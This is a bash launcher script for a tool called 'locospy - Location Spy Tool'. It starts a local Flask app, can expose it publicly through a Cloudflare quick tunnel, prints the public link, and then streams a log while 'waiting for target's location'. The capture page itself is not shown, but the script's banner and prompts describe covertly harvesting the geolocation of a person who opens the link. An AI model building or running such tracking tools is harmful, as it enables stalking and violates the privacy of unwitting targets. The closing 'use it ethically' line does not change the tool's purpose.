#!/bin/bash

FLASK_FILE="app.py"
PORT="5000"
TUNNEL_LOG="tunnel.log"
TUNNEL_PID=""
FLASK_PID=""
TAIL_PID=""

run_flask() {
  echo "[+] Starting Flask on http://127.0.0.1:$PORT ..."
  python3 $FLASK_FILE &
  FLASK_PID=$!
  sleep 3
}

start_cloudflare() {
  echo "[+] Starting Cloudflare Tunnel ..."
  cloudflared tunnel --url http://127.0.0.1:$PORT > $TUNNEL_LOG 2>&1 &
  TUNNEL_PID=$!

  echo "[*] Waiting for public URL..."
  for i in {1..15}; do
    LINK=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' $TUNNEL_LOG | head -1)
    if [ ! -z "$LINK" ]; then
      echo "[+] Public URL: $LINK"
      break
    fi
    sleep 1
  done

  if [ -z "$LINK" ]; then
    echo "[!] Could not retrieve public URL from Cloudflare Tunnel logs."
    echo "[!] No public URL available."
  fi
}

# UI header
echo "============================================"
echo "  ____       _                  ____        "
echo " |  _ \ ___ | | ___  _ __ ___  |  _ \  ___  "
echo " | |_) / _ \| |/ _ \| '__/ _ \ | | | |/ _ \ "
echo " |  _ < (_) | | (_) | | |  __/ | |_| |  __/ "
echo " |_| \_\___/|_|\___/|_|  \___| |____/ \___| "
echo "============================================"
echo "           locospy - Location Spy Tool       "
echo "============================================"
echo "Follow Me On Instagram: _gobinathan_"
echo "============================================"
echo "1. Run locally (127.0.0.1)"
echo "2. Make it public with Cloudflare Tunnel"
read -p "Choose an option (1 or 2): " option

if [[ "$option" == "1" ]]; then
  run_flask
  echo "[✔] Flask running locally at http://127.0.0.1:$PORT"
elif [[ "$option" == "2" ]]; then
  run_flask
  start_cloudflare
else
  echo "[!] Invalid option. Exiting."
  exit 1
fi

# Clear previous log
> location.log

echo ""
echo "[*] Waiting for target's location..."
echo "(Location data will appear below as soon as received)"
echo ""

# Tail the location log to display live location data
tail -f location.log &
TAIL_PID=$!

# Wait for user input to stop everything
read -p "Press ENTER to stop everything..."

# Cleanup
echo "[✖] Stopping services..."
kill $TAIL_PID 2>/dev/null
kill $FLASK_PID 2>/dev/null
if [[ ! -z "$TUNNEL_PID" ]]; then
  kill $TUNNEL_PID 2>/dev/null
fi
rm -f $TUNNEL_LOG location.log
echo "[✔] Everything stopped. This tool is developed by glader. Use it ethically."
